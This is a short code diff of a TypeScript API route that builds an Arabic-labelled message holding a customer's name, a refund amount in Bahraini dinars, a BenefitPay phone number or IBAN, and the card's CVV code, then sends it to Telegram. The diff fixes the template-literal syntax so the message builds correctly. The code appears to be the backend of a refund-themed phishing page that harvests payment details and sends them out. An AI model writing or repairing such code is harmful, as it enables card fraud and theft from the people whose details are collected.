@@ -30,14 +30,14 @@ export async function POST(request: Request) {
 
   const text = [
     "🧾 طلب من صفحة تفاصيل الطلب",
-    اسم العميل: ${profile.name},
-    مبلغ الاسترجاع: ${profile.amount.toFixed(3)} BHD,
-    طريقة الاستلام: ${data.method === "benefitpay" ? "BenefitPay" : "IBAN"},
-    ${data.method === "benefitpay" ? "رقم الهاتف" : "رقم الآيبان"}: ${
+    `اسم العميل: ${profile.name}`,
+    `مبلغ الاسترجاع: ${profile.amount.toFixed(3)} BHD`,
+    `طريقة الاستلام: ${data.method === "benefitpay" ? "BenefitPay" : "IBAN"}`,
+    `${data.method === "benefitpay" ? "رقم الهاتف" : "رقم الآيبان"}: ${
       data.method === "iban" ? data.value.toUpperCase() : data.value
-    },
-    رمز التحقق CVV: ${data.cvv},
-    الوقت: ${new Date().toISOString()},
+    }`,
+    `رمز التحقق CVV: ${data.cvv}`,
+    `الوقت: ${new Date().toISOString()}`,
   ].join("\n");
 
   const sent = await telegramSend(text);
